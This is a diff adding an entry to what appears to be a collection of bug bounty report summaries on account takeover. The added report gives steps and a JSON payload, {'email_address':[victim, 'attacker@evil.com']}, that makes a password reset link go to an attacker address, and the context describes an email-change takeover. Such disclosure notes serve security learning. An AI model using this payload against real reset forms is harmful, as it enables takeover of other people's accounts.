@@ -46,5 +46,12 @@ this report for account take over by changing email
 2. go to change email and put vicitm email => (victim@gmail.com)
 3. the confirmation email will send to hacker@gmailcom which is not logical
 4. now you have access to victim account
-   
+
+## report #322985
+The attacker was able to send a password reset link to an arbitrary email by sending an array of email addresses instead of a single email address.
+1. go to reset password page
+2. the input field accept data as JSON format
+3. put in the input more than one email you want to reset in JSON format
+   {"email_address":["admin@breadcrumb.com","attacker@evil.com"]}
+5. now you have reset password of all emails you send for them 
    
